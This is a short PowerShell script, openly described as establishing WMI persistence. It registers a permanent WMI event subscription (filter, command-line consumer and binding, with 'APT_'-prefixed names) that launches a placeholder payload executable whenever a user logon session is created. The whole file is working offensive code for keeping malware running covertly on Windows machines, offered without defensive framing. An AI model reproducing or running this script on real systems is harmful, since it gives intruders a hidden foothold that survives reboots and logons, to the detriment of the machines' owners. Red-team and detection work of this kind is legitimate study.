# PowerShell script for WMI persistence.
# Creates a WMI event subscription that executes a payload on user logon.

$filterName = "APT_WMI_Filter"
$consumerName = "APT_WMI_Consumer"
$command = "C:\path\to\payload.exe"

# Create the event filter
$query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'"
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name=$filterName; EventNamespace="root\cimv2"; Query=$query; QueryLanguage="WQL"}

# Create the event consumer
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName; CommandLineTemplate=$command}

# Bind the filter to the consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$filter; Consumer=$consumer}

Write-Host "WMI persistence established."

